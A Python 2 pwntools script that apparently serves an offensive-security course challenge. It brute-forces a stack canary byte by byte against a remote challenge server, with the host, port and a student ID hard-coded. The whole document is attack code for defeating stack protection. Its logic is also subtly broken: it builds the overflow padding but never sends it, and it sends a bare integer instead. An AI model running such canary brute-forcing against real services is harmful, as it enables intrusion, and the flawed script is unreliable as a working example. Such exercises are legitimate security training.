#!/usr/bin/env python2

from pwn import *
import time
import struct

PADDING = 32
canary = [0x00]

#challenge-specific info
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1340
netid='pk1898'
r = remote(host, port)
for cb in range(3):

    currentByte = 0x00
    for i in range(255):
        r = remote(host, port)
        r.sendline(netid)
        print r.recvline()
        r.recvuntil("First, how long is your name?")
        r.sendline("32")
        r.recvuntil("of data")
        print "[+] Trying %s (Byte #%d)..." % (hex(currentByte), cb + 2)


        DATA = "A" * PADDING


        r.sendline(currentByte)

        received = ""
        try:
            received = r.recvuntil("... and goodbye!")
        except EOFError:
            print "Process Died"
        finally:
            r.close()

        if "... and goodbye!" in received:
            canary.append(currentByte)
            print "\n[*] Byte #%d is %s\n" % (cb + 2, hex(currentByte))
            currentByte = 0
            break
        else:
            currentByte += 1

print "Found Canary:"
print " ".join([hex(c) for c in canary])
